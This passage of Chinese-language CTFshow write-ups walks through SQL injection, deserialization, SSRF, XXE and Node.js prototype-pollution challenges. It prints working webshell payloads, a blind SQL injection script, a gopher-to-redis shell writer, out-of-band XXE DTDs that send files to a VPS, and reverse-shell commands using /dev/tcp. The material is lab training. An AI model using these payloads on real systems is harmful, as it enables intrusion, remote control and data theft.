'&quot;.$username.&quot;' and password='&quot;.md5($password).&quot;' order by id limit 1&quot;; $user=db::select_one($sql); if($user){ templateUtil::render('index',array('username'=&gt;$user-&gt;username)); }else{ templateUtil::render('error'); }} sql语句变了，username那里没有md5包裹了，然后render('index',array('username'=&gt;$username));变成了render('index',array('username'=&gt;$user-&gt;username)); 那好办，方法跟之前一样，只不过这次通过sql注入改变查询的username的值，使后面的$user-&gt;username能返回我们想要的值 但是一开始输入payload 1/index.php?action=check&amp;username=1' union select '&lt;?php eval($_POST[1]);?&gt;'--+&amp;password=1 会发现莫名其妙返回了一个?&gt; 查看/cache/6a992d5529f459a44fee58c733255e86.php，发现页面显示语法错误 那估计大概率是字符串替换后本身就已经被php标签包裹了，所以多出来的?&gt;就显示在页面上了。后面发现/index.php?action=index可以看到传入后的代码，也验证了猜想 那我们修改一下代码，先输入/index.php?action=clear清空缓存，再传入payload，后面的题目如果有输入过username这些，记得一定要先清空cache，不然内容写不进去 1/index.php?action=check&amp;username=1' union select 'eval($_POST[1])'--+&amp;password=1 蚁剑连接，在根目录找到flag web491继续分析代码 被修复了，不能用之前的方法写入webshell了，但是username那边没有md5包裹，可以用SQL注入获取flag payload： 1/index.php?action=check&amp;username=1' union select load_file('/flag') into outfile &quot;/tmp/3.php&quot; --+&amp;password=1 然后目录穿越读取flag web492先看代码 这个多了一个正则，然后上题的templateUtil::render('index')改回templateUtil::render('index',$user)，可以继续用之前的方法 payload： 1/index.php?action=check&amp;username='1&amp;user[username]=&lt;?php eval($_POST[1]);?&gt; 大概思路就是利用extract($_GET);污染变量，然后username随便带个符号跳过正则验证直接来到templateUtil::render('index',$user)，后面的步骤跟之前一样，也是通过字符串替换写入webshell 然后蚁剑连接读取flag web493先看代码 因为下面的render只传入了$template，没有传入数组参数，所以不能走这条路。然后SQL那里又有正则限制，不能出现符号，所以也无法进行SQL注入，但是上面出现了关键代码 1234if(!isset($action)){ if(isset($_COOKIE['user'])){ $c=$_COOKIE['user']; $user=unserialize($c); 那我们可以用反序列化来做这题，读取上面的render/db_class.php 1/index.php?action=../render/db_class 得到代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&lt;?phperror_reporting(0);class db{ public $db; public $log; public $sql; public $username='root'; public $password='root'; public $port='3306'; public $addr='127.0.0.1'; public $database='ctfshow'; public function __construct(){ $this-&gt;log=new dbLog(); $this-&gt;db=$this-&gt;getConnection(); } public function getConnection(){ return new mysqli($this-&gt;addr,$this-&gt;username,$this-&gt;password,$this-&gt;database); } public function select_one($sql){ $this-&gt;sql=$sql; $conn = db::getConnection(); $result=$conn-&gt;query($sql); if($result){ return $result-&gt;fetch_object(); } } public function select_one_array($sql){ $this-&gt;sql=$sql; $conn = db::getConnection(); $result=$conn-&gt;query($sql); if($result){ return $result-&gt;fetch_assoc(); } } public function __destruct(){ $this-&gt;log-&gt;log($this-&gt;sql); }}class dbLog{ public $sql; public $content; public $log; public function __construct(){ $this-&gt;log='log/'.date_format(date_create(),&quot;Y-m-d&quot;).'.txt'; } public function log($sql){ $this-&gt;content = $this-&gt;content.date_format(date_create(),&quot;Y-m-d-H-i-s&quot;).' '.$sql.' \\r\\n'; } public function __destruct(){ file_put_contents($this-&gt;log, $this-&gt;content,FILE_APPEND); }} 构建反序列化payload 12345678910111213141516171819202122&lt;?phpclass db{ public $log; public $sql; public function __construct(){ $this-&gt;log=new dbLog(); }}class dbLog{ public $sql; public $content; public $log; public function __construct(){ $this-&gt;log='log/3.php'; $this-&gt;content ='&lt;?php eval($_POST[1]);?&gt;'; }}$a = new db();$b = urlencode(serialize($a));echo $b; 得到结果为 1O%3A2%3A%22db%22%3A2%3A%7Bs%3A3%3A%22log%22%3BO%3A5%3A%22dbLog%22%3A3%3A%7Bs%3A3%3A%22sql%22%3BN%3Bs%3A7%3A%22content%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3Bs%3A3%3A%22log%22%3Bs%3A9%3A%22log%2F3.php%22%3B%7Ds%3A3%3A%22sql%22%3BN%3B%7D 然后cookie写入payload，记得要满足if(!isset($action))，把action参数删去就可以 然后蚁剑连接 web494先看代码 一开始看到templateUtil::render('index',$user)，我以为可以继续用之前的方法，但是后面连接webshell怎么都连不上，读取/render/cache_class.php代码之后发现php后缀改成html后缀了，那没办法了 反序列化那里加了if(preg_match('/\\:|\\,/', $c)){来过滤，不过不影响，继续用上题的反序列化方法 payload： 12345678910111213141516171819202122&lt;?phpclass db{ public $log; public $sql; public function __construct(){ $this-&gt;log=new dbLog(); }}class dbLog{ public $sql; public $content; public $log; public function __construct(){ $this-&gt;log='log/3.php'; $this-&gt;content ='&lt;?php eval($_POST[1]);?&gt;'; }}$a = new db();$b = urlencode(serialize($a));echo $b; 结果 1O%3A2%3A%22db%22%3A2%3A%7Bs%3A3%3A%22log%22%3BO%3A5%3A%22dbLog%22%3A3%3A%7Bs%3A3%3A%22sql%22%3BN%3Bs%3A7%3A%22content%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3Bs%3A3%3A%22log%22%3Bs%3A9%3A%22log%2F3.php%22%3B%7Ds%3A3%3A%22sql%22%3BN%3B%7D 然后cookie传入，蚁剑连接webshell，找了一会找不到flag，那连接数据库看看，先读取/render/db_class.php查看数据库配置信息 然后蚁剑连接 读取flag web495核心代码没有变 123456if(!isset($action)){ if(isset($_COOKIE['user'])){ $c=$_COOKIE['user']; if(preg_match('/\\:|\\,/', $c)){ $user=unserialize($c); } 可以继续用上题的方法，flag在数据库 web496查看代码 发现反序列化代码被注释了，然后SQL正则那里多了一些过滤，可以用万能密码登录系统 12账号：'||1=1#密码：1 进去后点击基本资料，可以看到管理员信息修改 查看网页源码，发现是通过POST发送请求到api/admin_edit.php 我们查看api/admin_edit.php的源码，GET请求/index.php?action=../api/admin_edit 可以看到有个update语句，然后下面有修改成功和失败的文本信息。那我们的思路就是写个脚本，先用万能密码登录保持登录状态，然后在user[username]数组里写payload进行布尔盲注，同时要保证nickname不重复 payload： 123456789101112131415161718192021222324import requestsimport stringurl = &quot;http://eb072399-7e45-41c9-a2dd-d30c29f993ee.challenge.ctf.show&quot;chars = &quot;qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890[]{},.-_&quot;result = &quot;&quot;session = requests.session()session.post(url + &quot;?action=check&quot;, data={&quot;username&quot;:&quot;'||1=1#&quot;, &quot;password&quot;:1})for pos in range(1, 100): found = False for c in chars: #payload = &quot;'||if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1)='{1}',1,0)#&quot;.format(pos, c) #payload = &quot;'||if(substr((select group_concat(column_name) from information_schema.columns where table_name='flagyoudontknow76'),{0},1)='{1}',1,0)#&quot;.format(pos, c) payload = &quot;'||if(substr((select flagisherebutyouneverknow118 from flagyoudontknow76),{0},1)='{1}',1,0)#&quot;.format(pos, c) data = {'nickname': str(pos), 'user[username]': payload} response = session.post(url + &quot;/api/admin_edit.php&quot;, data=data) if &quot;u529f&quot; in response.text: result += c print(result) found = True break if not found: break 运行脚本得到flag web497查看代码 $user=unserialize($c)的注释去掉了，但是前面的正则匹配加了感叹号，也就是不能出现冒号和逗号，那我们不走这个方法，继续用万能密码登录系统，账号'||1=1#，密码1 然后点击基本信息，发现头像处可以修改 直接file协议读取flag文件，存在SSRF漏洞 1file:///flag 修改成功后右键点击头像，选择在新标签页中打开图像，成功读到flag web498也是上一题的方法，读/etc/passwd可以，但是读flag读不到了，可能是权限不足，也可能是flag不叫这个名字了或者在其他目录 刚好看到/etc/passwd里面有个redis，输入dict://127.0.0.1:6379探测端口开放情况 用Gopher协议打SSRF就可以，工具Gopherus 1gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2428%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B1%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A 然后访问/shell.php，查看根目录 读取flag web499头像地址没了，SSRF打不通 随便点了一下，发现系统配置可以打开 查看源代码，发现有个api/admin_settings.php路径 查看api/admin_settings.php源码 关键代码 123456if($user){ $config = unserialize(file_get_contents(__DIR__.'/../config/settings.php')); foreach ($_POST as $key =&gt; $value) { $config[$key]=$value; } file_put_contents(__DIR__.'/../config/settings.php', serialize($config)); 它会把POST传进来的键值对放入数组，然后写入文件config/settings.php，我们看看config/settings.php源码 刚好对应的就是前面的系统配置页面，那我们在系统配置页面传入一句话木马 可以看到木马已经成功写入 蚁剑连接 在根目录找到flag web500上题的代码改了，不是写到php文件了，那我们换个方法 回到管理页面点了一通，发现数据库备份可以打开 查看源码，发现其POST请求发送到api/admin_db_backup.php，那我们读取源码看看 关键代码shell_exec('mysqldump -u root -h 127.0.0.1 -proot --databases ctfshow &gt; '.__DIR__.'/../backup/'.$db_path)，那我们可以拼接命令读取flag payload： 1;cat /f*&gt;/var/www/html/1.txt 然后访问1.txt读取flag web501这次修改名称的地方不见了 查看代码，发现其多了个正则匹配 因为前面有个extract($_POST)，然后数据库备份的源码写了POST请求的目标地址 那我们可以直接向目标地址发送POST请求执行命令 然后访问/1.txt读取flag","link":"/posts/ctfshow-mid-term-assessment-web486-web501/"},{"title":"CTFSHOW | XXE题解 web373 - web378","text":"什么是XMLXML，全称为可扩展标记语言（eXtensible Markup Language），设计宗旨是传输和存储数据 可以把它和HTML对比来理解： HTML 的标签（如&lt;h1&gt;, &lt;p&gt;）是预定义好的，主要功能是告诉浏览器如何显示内容。 XML 的标签则可以由开发者根据需求自己定义，用来清晰地描述数据的结构和含义。 举个例子 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;note&gt; &lt;to&gt;小明&lt;/to&gt; &lt;from&gt;小红&lt;/from&gt; &lt;heading&gt;提醒&lt;/heading&gt; &lt;body&gt;别忘了周五的会议！&lt;/body&gt;&lt;/note&gt; 为了更好地理解XXE，我们还需要了解XML中两个与漏洞密切相关的关键组件：DOCTYPE 和 ENTITY DOCTYPE (文档类型声明) ：它通常出现在XML文档的顶部，用于定义该文档的结构和规则。对于XXE漏洞来说，DOCTYPE最重要的作用是，它提供了一个可以定义实体（ENTITY）的地方 ENTITY (实体) ：必须在DOCTYPE声明中定义，主要有两种： 内部实体：像一个简单的文本变量，方便在文档中复用。例如：&lt;!ENTITY author &quot;Wayne&quot;&gt;，之后在文档中使用的 &amp;author; 就会被替换为 “Wayne” 外部实体：这是XXE漏洞的核心。它允许我们引用外部资源的内容，例如服务器上的一个文件或一个网址。例如：&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; 什么是XXEXXE全称是“XML外部实体注入”（XML External Entity Injection），当一个应用程序接收并解析了用户提交的XML数据，但其XML解析器配置不当时，就容易产生XXE漏洞 流程大概如下 构造一个恶意的XML文档 在文档中定义一个指向服务器本地敏感文件的外部实体，例如： &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; 在XML数据中引用这个实体 &amp;xxe; 服务器在解析这段XML时，会查找并读取 /etc/passwd 文件的内容，并用它替换掉 &amp;xxe; 最后，攻击者通过页面的回显（有回显XXE）或将数据发送到自己的服务器（无回显XXE）来窃取信息 题目列表web373题目给了源码，我们可以分析一下 1234567891011121314151617&lt;?phperror_reporting(0);//允许加载外部实体，在PHP 8.0及以上版本，此项默认为true。libxml_disable_entity_loader(false);//从HTTP请求的body中读取原始数据，一般是POST请求的内容。$xmlfile = file_get_contents('php://input');if(isset($xmlfile)){ //新建一个DOMDocument对象，用于处理XML。 $dom = new DOMDocument(); //LIBXML_NOENT: 替换XML文档中的实体；LIBXML_DTDLOAD: 允许加载外部DTD。 $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); //把DOM对象转换为PHP对象。 $creds = simplexml_import_dom($dom); $ctfshow = $creds-&gt;ctfshow; echo $ctfshow;}highlight_file(__FILE__); 由源码可知，这是个有回显的XXE，因此直接POST注入即可 payload： 12345678&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;!-- 对应源码的$ctfshow = $creds-&gt;ctfshow; --&gt;&lt;creds&gt;&lt;ctfshow&gt;&amp;xxe;&lt;/ctfshow&gt;&lt;/creds&gt; web374分析源码 相比上一题，这一题少了回显代码，也就是 123$creds = simplexml_import_dom($dom);$ctfshow = $creds-&gt;ctfshow;echo $ctfshow; 因此这是个无回显的XXE，需要用到vps进行数据外带显示 payload： 12&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY % xxe SYSTEM &quot;http://vps地址/test.dtd&quot;&gt;%xxe;]&gt; 然后在vps的网站根目录创建test.dtd 12345&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;&lt;!-- “&amp;#x25;”是 % 的意思,因为是嵌套引用，所以不能直接写% --&gt;&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; out SYSTEM 'http://vps地址:1234/?x=%file;'&gt;&quot;&gt;%eval;%out; 保存文件并退出Vim：按下ESC进入命令模式，然后输入:wq并按回车键 最后在服务器用nc监听1234端口 1nc -lvvp 1234 接着发送POST请求 重新回到vps查看加密内容，然后base64解码即可 我们来分析一下思路，简单来说就是初始Payload调用了外部DTD，外部DTD中先用一个实体%eval;去定义另一个能发送数据的实体%out;，然后再调用这个新实体将文件内容外带出来 那为什么要这样子套娃，直接调用不可以吗 12&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;&lt;!ENTITY % out SYSTEM &quot;http://vps地址:1234/?x=%file;&quot;&gt; %out; 如果直接调用，上面第二步中的 &lt;!ENTITY % out ...&gt; 会直接导致XML解析器报错。因为在解析器看来，%file; 这个引用被用在了另一个实体 out 的定义字符串里，这是不被允许的 因此我们需要嵌套使用，用外部实体%eval;把内层命令伪装成一个字符串，当外部实体被调用后，此时%file; 实体已经被定义过了，最后再调用%out;，就可以成功执行命令 12345&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;&lt;!-- “&amp;#x25;”是 % 的意思,因为是嵌套引用，所以不能直接写% --&gt;&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; out SYSTEM 'http://vps地址:1234/?x=%file;'&gt;&quot;&gt;%eval;%out; web375先看看源码 跟上一题差不多，不过这次多了一个过滤条件，由于它是匹配整一个语句&lt;?xml version=&quot;1.0&quot;，因此有很多方法绕过 123if(preg_match('/&lt;\\?xml version=&quot;1\\.0&quot;/', $xmlfile)){ die('error');} 方法一： 在xml和version中加一个空格 12&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY % xxe SYSTEM &quot;http://vps地址/test.dtd&quot;&gt;%xxe;]&gt; 方法二： 直接把&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;去掉 1&lt;!DOCTYPE test [&lt;!ENTITY % xxe SYSTEM &quot;http://vps地址/test.dtd&quot;&gt;%xxe;]&gt; 方法三： 把双引号改成单引号，即&lt;?xml version='1.0' encoding=&quot;UTF-8&quot;?&gt; 12&lt;?xml version='1.0' encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY % xxe SYSTEM &quot;http://vps地址/test.dtd&quot;&gt;%xxe;]&gt; 随便选一种方法做即可，其他步骤跟上一题一样，成功得到flag web376先看源码 相比上一题，这题的过滤条件多了一个检测大小写功能，但是不影响做题，可以用上一题的方法 web377分析源码 这次多了一个http的过滤，可以用编码绕过，xml不仅支持UTF-8编码，也支持UTF-16、UTF-32和EBCDIC编码 因此我们在web375绕过&lt;?xml version=&quot;1.0&quot;的基础上，加一个编码转换即可，用python脚本完成 1234567891011import requestsurl = &quot;http://48e31982-9b66-42aa-b386-f34f7b7f8d36.challenge.ctf.show/&quot;payload = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY % xxe SYSTEM &quot;http://vps地址/test.dtd&quot;&gt;%xxe;]&gt;&quot;&quot;&quot;payload = payload.encode('utf-16')response = requests.post(url, data=payload)print(response.text) 先在vps监听端口，然后运行脚本 web378打开题目看到一个登录框 ctrl+u查看网页源码，可以判断存在XXE漏洞 在登录框页面随便输入个账号密码，可以看到有回显，因此是属于有回显的XXE 因此我们可以构造XML payload，然后POST发送到/doLogin即可，这里用python脚本 1234567891011121314import requestsurl = &quot;http://39e1f8ce-fd5e-483d-a620-38d00350bff3.challenge.ctf.show/doLogin&quot;payload = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;&amp;xxe;&lt;/password&gt;&lt;/user&gt;&quot;&quot;&quot;response = requests.post(url, data=payload)print(response.text)","link":"/posts/ctfshow-xxe-web373-web378/"},{"title":"CTFSHOW | nodejs题解 web334 - web344","text":"什么是nodejsNode.js 是一个基于 Chrome V8 引擎的开源、跨平台的 JavaScript 运行环境，主要用于在服务端运行JavaScript代码。以前JavaScript大多只能在浏览器中运行，有了 Node.js，开发者可以用 JavaScript 开发后端服务端应用，比如Web服务器、命令行工具等 核心特点如下： 采用 事件驱动、非阻塞式I/O模型，使其高效、轻量，特别适合处理高并发、I/O密集的网络应用 利用 V8 引擎，JavaScript 代码执行速度快、性能高 拥有全球最大的开源包管理生态系统—— npm，可便捷地安装和管理各种第三方模块和工具包 让前端开发者可以用同一种语言开发前后端，提高开发效率与协同 Node.js 不是一门新语言，也不是JavaScript的框架，更不是Web服务器；它就是一个能在服务器端运行JavaScript的平台，类似于Java的JVM在服务器上运行Java程序 题目列表web334下载题目附件进行分析，一共就两个文件 user.js里面写了用户账号密码 然后login.js是关于登录的一些逻辑校验，其中我们需要重点关注的是findUser变量这里 1return name!=='CTFSHOW' &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password; 要求名字不为CTFSHOW，但是后面有个toUpperCase()函数，也就是输入的用户名会变大写，那只要输入小写的ctfshow，经过toUpperCase()变大写之后就通过验证了 打开题目环境，登录框输入 12账号：ctfshow密码：123456 成功拿到flag web335打开题目环境，查看网页源代码，可以看到有注释提示，可以拼接进网站访问 应该是eval()函数，可以用child_process来调用API执行系统命令 什么是child_process child_process 是 Node.js 的一个核心模块，用于在应用程序中创建和管理子进程，让 JavaScript 能够在服务器端执行外部命令、脚本或者进行多进程并发运算 常用API spawn()：创建新进程，流方式处理数据，适合实时数据处理 exec()：执行命令或脚本，回调方式返回所有输出，适合一次性任务 execFile()：直接执行文件，减少命令注入风险 fork()：专门用于启动新的 Node.js 进程，并与主进程实现 IPC（进程间通信） execSync()：同步执行命令，阻塞直到完成，返回结果，简洁直观 spawnSync()：同步版本的 spawn，阻塞等待子进程完成，返回详细进程信息 这题需要我们用require包含child_process模块来调用API执行命令 但是如果我们直接执行exec()，会返回[object Object] 1/?eval=require('child_process').exec('ls').toString() 这是因为exec()是异步执行，通过回调函数传递输出与错误，直接调用的话会返回一个 ChildProcess 对象，正确的方法应像下面这样 1234const { exec } = require('child_process');const cp = exec('ls', (err, stdout, stderr) =&gt; { console.log(stdout); // 这里才是命令输出}); 而execSync()则是同步执行，直接返回命令执行后的输出内容（Buffer 或 String），可以直接打印数据 所以我们用execSync()来执行命令 payload： 1/?eval=require('child_process').execSync('ls').toString() 成功得到flag 当然调用spawnSync()也可以，不过直接打印的话它会返回一个包含多个属性的对象，需要用stdout输出Buffer，然后通过toString()转换为字符串，调用格式为spawnSync(command, args)。如果你把命令和参数写在同一个字符串里（如 'cat fl00g.txt'），spawnSync 会当作单一命令去执行，导致找不到该命令或执行出错，因此需要拆开 payload： 1/?eval=require('child_process').spawnSync('cat',['fl00g.txt']).stdout.toString() web336这题跟上题差不多，但是调用execSync()不行了 这里介绍两个变量，__filename和__dirname 12__filename：获取当前模块文件的完整绝对路径文件名__dirname：获取当前文件所在目录的完整目录名 直接在网站拼接命令执行 1/?eval=__filename 可以看到网站显示了当前文件的绝对路径/app/routes/index.js 我们用fs模块的readFileSync()来读取文件，fs模块（File System 模块）是专门用于进行文件系统相关操作的 1/?eval=require('fs').readFileSync('/app/routes/index.js').toString() 直接爆出源码 12345678910111213141516var express = require('express');var router = express.Router();/* GET home page. */router.get('/', function(req, res, next) { res.type('html'); var evalstring = req.query.eval; if (typeof(evalstring) == 'string' &amp;&amp; evalstring.search(/exec|load/i) &gt; 0) { res.render('index', { title: 'tql' }); } else { res.render('index', { title: eval(evalstring) }); }});module.exports = router; 可以看到过滤了包含 exec 或 load 的字符串，有很多种方法可以做这题 1. 字符串拼接绕过 把execSync拆成 exe + cSync，然后拼接字符串，%2B是加号 1/?eval=require('child_process')['exe'%2B'cSync']('ls').toString() 然后读取flag即可 1/?eval=require('child_process')['exe'%2B'cSync']('cat fl001g.txt').toString() 2. spawnSync() 命令执行 跟web335一样，换成spawnSync()即可绕过 1/?eval=require('child_process').spawnSync('cat',['fl001g.txt']).stdout.toString() 3. readFileSync() 文件读取 先用readdirSync()读取目录文件，然后用readFileSync()读取文件内容即可 12/?eval=require('fs').readdirSync('.')/?eval=require('fs').readFileSync('fl001g.txt') web337题目给出了源码 12345678910111213141516171819202122232425var express = require('express');var router = express.Router();var crypto = require('crypto');function md5(s) { return crypto.createHash('md5') .update(s) .digest('hex');}/* GET home page. */router.get('/', function(req, res, next) { res.type('html'); var flag='xxxxxxx'; var a = req.query.a; var b = req.query.b; if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag)){ res.end(flag); }else{ res.render('index',{ msg: 'tql'}); } });module.exports = router; 其中重点需要关注的是 1if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag)){ 要求传入的a和b长度相同，内容不相同且要求 a 加上 flag 后的 MD5 哈希值，必须等于 b 加上 flag 后的 MD5 哈希值 这里我们用数组绕过 这里涉及到一个概念，如果传入a[]=1&amp;b[]=2，返回的是数组['1']和['2']，在md5校验那里就相当于需要['1']+flag===['2']+flag，而由于JavaScript **隐式类型转换 + 字符串拼接 **的原因，['1']+flag会变成1flag，举个例子 123console.log(&quot;1&quot; + [2,2]);// 步骤： [2,2] -&gt; 调用 toString() =&gt; &quot;2,2&quot;// 字符串拼接 =&gt; &quot;1&quot; + &quot;2,2&quot; =&gt; &quot;12,2&quot; 因此只要我们输入 1a[]=1&amp;b=1 a解析为数组['1']，b解析为字符串'1'，经过转换之后，得到的结果都是1flag，因此它们的md5相同，成功通过验证 也是顺利拿到flag 还有一种方法，就是往数组里面传入非数字索引，例如 1a[x]=1&amp;b[x]=2 返回的结果是{ x: '1'}和{ x: '2'}，变成JS里面的对象了，传入对象之后，经过console.log后返回的都是[object Object]，此时进行变量拼接得到的结果为[object Object]flag，再进行md5加密之后也是相同的 如果传入a[x]=1&amp;b[x]=1也是可以的，因为两个对象的比较并不是比较属性，而是通过引用内存里的位置来比较的，所以 a !== b 的条件依然成立 web338下载源码分析，先看app.js 可以看到包含了index.js和login.js，index.js里面没什么东西，主要看login.js文件 想要拿到flag就必须要secert的ctfshow属性值为36dboy，且secert变量值为空。向下分析，可以看到body的内容被copy到了user里面，查看copy的定义，可以发现copy竟然跟merge方法一模一样，因此这题可以用原型链污染来做，传入属性__proto__来污染Object原型 做原型链污染之前，建议先看一遍文章了解一下：深入理解 JavaScript Prototype 污染攻击 打开题目环境，随便输入账号密码 可以看到body的值传到了user里面，我们修改键值对为 1{&quot;__proto__&quot;:{&quot;ctfshow&quot;:&quot;36dboy&quot;}} 这样做可以污染Object的原型，从而使得所有对象都继承了该属性，于是进行验证的时候，满足secert.ctfshow==='36dboy'，也就拿到了flag 原型链被污染后，部分代码里其他依赖对象原型正常结构的地方会出错，依赖于纯净、标准原型链的对象操作（比如 for…in、Object.keys()、属性枚举和判断、库函数内部操作等）可能会出错或出现行为异常，导致POST访问/login时报 500 错误 因此这题只有一次污染机会，如果写错了值的话就只能重新启动环境做了，因为POST访问/login只返回500了 web339打开源码分析，在app.js可以看到指向三个路由 相比上一题，这题login.js的校验条件变了 要求secert.ctfshow===flag，但我们并不知道flag的值，因此只能另辟蹊径 继续分析api.js，发现可以通过污染query来控制Function执行RCE操作 由于 Node.js 默认不会自动暴露 require 给 Function 创建的函数，因此这里用process.mainModule.constructor._load 替代 require来包含child_process payload： 1{&quot;__proto__&quot;:{&quot;query&quot;:&quot;return global.process.mainModule.constructor._load('child_process').exec('bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/你的VPS地址/端口 0&gt;&amp;1\\&quot;')&quot;}} 这里我们用exec执行反弹shell，因为exec是异步的，适用于长时间/交互式/不需要立即结果的任务（例如反弹 shell、启动后台进程、并发执行多任务）。这题的目标不是“读取输出”，而是“建立外部控制会话”，因此异步 exec 足以完成“执行命令”的动作，而且更贴合反连的使用场景：父进程不被阻塞，持续提供服务 先在VPS处开启nc监听，然后跟上题一样，在/login处传入payload 接着POST访问/api即可建立连接 执行命令env，在环境变量里成功找到flag web340下载源码进行分析，也是先看app.js 可以看到，还是这几个文件，不过不同的是，login.js里面的user变量变了 要求isAdmin为true才可以通过，但是isAdmin已经被赋值为false了，因此在这里没办法污染 继续分析，可以看到api.js跟上题一样，因此可以用上题的方法来污染query反弹shell 但是如果直接传入__proto__，再访问/api会发现行不通 需要污染两层才可以，因为user.__proto__不是Object.prototype，user.__proto.__proto__才是 1{&quot;__proto__&quot;:{&quot;__proto__&quot;:{&quot;query&quot;:&quot;return global.process.mainModule.constructor._load('child_process').exec('bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/你的VPS地址/端口 0&gt;&amp;1\\&quot;')&quot;}}} 也是在环境变量处找到flag 下面详细解释一下为什么user.__proto__不是指向Object.prototype，开启本地调试，先在web340项目文件夹处打开终端，运行 npm install安装依赖 然后在项目文件夹处打开package.json，可以看到负责启动服务器的是bin/www，因为在很多标准的Express项目中，项目结构是分离的 修改配置文件的工作目录为web340，文件为bin/www 在www文件中，可以看到运行的端口是在3000 在login.js的第19行开启断点调试，然后在浏览器中打开 http://127.0.0.1:3000 ，在登录框随便输入点东西，触发if(user.userinfo.isAdmin){判断 可以看到userinfo的__proto__后__proto__才是Object的prototype，为了更直观，我们在控制台输出看看 对于user这个变量 1234567var user = new function(){ //这是外层匿名构造函数 this.userinfo = new function(){ //这是内层匿名构造函数 this.isVIP = false; this.isAdmin = false; this.isAuthor = false; };} user.userinfo 对象是由内层构造函数创建的，所以 user.userinfo.__proto__ 指向内层构造函数的prototype 而内层构造函数的__proto__指向的才是Object的prototype 所以这就是为什么要传入两次的原因 拓展概念 只有函数才拥有 prototype 属性，而由构造函数创建出来的普通对象实例没有这个属性 例如user.userinfo是一个对象实例，但它没有属于自己的 prototype 属性，控制台输出为undefined 属性 谁拥有 作用 prototype 构造函数 定义实例继承的“蓝图” __proto__ 任意对象实例（包括函数对象） 一个指向其构造器的 prototype 的引用指针 web341下载附件分析代码，发现这题没有api.js了，而且login.js也没有地方污染 继续分析代码，在app.js可以看到包含了ejs，且引擎设置为ejs 网上搜了一下，发现ejs模板引擎有个漏洞可以利用，实现从原型链污染到RCE 参考文章：Express+lodash+ejs: 从原型链污染到RCE payload： 1{&quot;__proto__&quot;:{&quot;__proto__&quot;:{&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require('child_process').exec('bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/你的VPS地址/端口 0&gt;&amp;1\\&quot;');var __tmp2&quot;}}} 跟上题一样，也是在/login里POST写入，然后刷新一次页面即可 在env找到flag web342下载代码分析，总体跟上题代码差不多，但是app.js这两个地方不同 模板引擎换成了jade，上网参考了部分文章，链接：再探 JavaScript 原型链污染到 RCE payload： 1{&quot;__proto__&quot;:{&quot;__proto__&quot;: {&quot;type&quot;:&quot;Block&quot;,&quot;nodes&quot;:&quot;&quot;,&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require('child_process').exec('bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/你的VPS地址/端口 0&gt;&amp;1\\&quot;')&quot;}}} 跟上题一样，在/login里POST写入，然后刷新一次页面 在env找到flag web343这题在web342的基础上增加了过滤，但是影响不大，可以继续用上题的方法 payload： 1{&quot;__proto__&quot;:{&quot;__proto__&quot;: {&quot;type&quot;:&quot;Block&quot;,&quot;nodes&quot;:&quot;&quot;,&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require('child_process').exec('bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/你的VPS地址/端口 0&gt;&amp;1\\&quot;')&quot;}}} 